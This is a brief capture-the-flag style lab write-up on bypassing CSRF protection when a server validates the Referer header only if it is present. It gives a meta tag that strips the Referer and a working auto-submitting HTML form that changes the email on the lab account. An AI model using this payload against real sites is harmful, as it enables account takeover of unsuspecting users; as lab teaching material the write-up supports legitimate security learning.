# Lab: CSRF where Referer validation depends on header being present


The application check the content of the referer header, if there is one the application compare it with the vulnerable lab url. (https://MY-LAB.web-security-academy.net)

Setting up the following header: 
```html
<meta name="referrer" content="none">
```
will delete the referer header from the request. In this case the backend skip the test.

Other value for the content attribute:  none, never, ..


## payload 

```html
<meta name="referrer" content="none">
<form id="login-form" name="change-email-form" action="https://MY-LAB.web-security-academy.net/my-account/change-email" method="POST">
    <input required type="email" name="email" value="nothing23@nothing.co">
</form>
<script>
    let formulaire=document.getElementById("login-form");
    formulaire.submit();
</script>
```
